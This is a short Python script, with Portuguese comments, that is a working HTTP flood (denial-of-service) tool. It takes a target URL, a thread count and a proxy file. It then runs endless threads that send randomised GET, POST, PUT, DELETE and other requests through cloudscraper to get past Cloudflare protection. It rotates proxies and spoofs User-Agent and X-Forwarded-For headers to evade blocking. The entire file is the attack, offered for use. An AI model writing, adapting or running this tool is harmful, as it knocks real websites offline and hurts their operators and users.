import random
import threading
import cloudscraper

# Tentativa de usar fake_useragent
try:
    from fake_useragent import UserAgent
    ua = UserAgent()
    use_fakeua = True
except:
    print("[!] fake_useragent não disponível, usando fallback.")
    use_fakeua = False

# Fallback User-Agents
fallback_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)",
    "curl/7.68.0",
    "Wget/1.20.3"
]

def smart_user_agent():
    if use_fakeua:
        try:
            return ua.random
        except:
            return random.choice(fallback_user_agents)
    else:
        return random.choice(fallback_user_agents)

accepts = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "*/*",
    "application/json",
    "text/plain"
]

http_methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH"]

# Headers aleatórios
def generate_headers():
    return {
        "User-Agent": smart_user_agent(),
        "Accept": random.choice(accepts),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive",
        "Referer": "http://google.com"
    }

# Entrada do usuário
target_url = input("🛡️ Digite a URL do alvo (com http:// ou https://): ").strip()
threads = int(input("Quantidade de threads: "))
proxy_file = input("Caminho do arquivo de proxies (.txt): ").strip()

# Leitura de proxies
def load_proxies(path):
    try:
        with open(path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print("[x] Erro ao carregar proxies.")
        return []

proxies = load_proxies(proxy_file)

# Função de ataque
def flood():
    while True:
        try:
            proxy = random.choice(proxies)
            proxy_dict = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }

            scraper = cloudscraper.create_scraper()

            method = random.choice(http_methods)
            headers = generate_headers()

            if method == "GET":
                scraper.get(target_url, headers=headers, proxies=proxy_dict, timeout=5)
            elif method == "POST":
                data = {"data": random.randint(1, 100)}
                scraper.post(target_url, headers=headers, data=data, proxies=proxy_dict, timeout=5)
            elif method == "PUT":
                data = {"put": "value"}
                scraper.put(target_url, headers=headers, data=data, proxies=proxy_dict, timeout=5)
            elif method == "DELETE":
                scraper.delete(target_url, headers=headers, proxies=proxy_dict, timeout=5)
            elif method == "HEAD":
                scraper.head(target_url, headers=headers, proxies=proxy_dict, timeout=5)
            elif method == "OPTIONS":
                scraper.options(target_url, headers=headers, proxies=proxy_dict, timeout=5)
            elif method == "PATCH":
                data = {"patch": "value"}
                scraper.patch(target_url, headers=headers, data=data, proxies=proxy_dict, timeout=5)

            print(f"[+] {method} enviado via {proxy}")
        except Exception as e:
            print(f"[!] Falha com {proxy}: {e}")

# Inicializa as threads
for i in range(threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

# Mantém o programa vivo
while True:
    pass
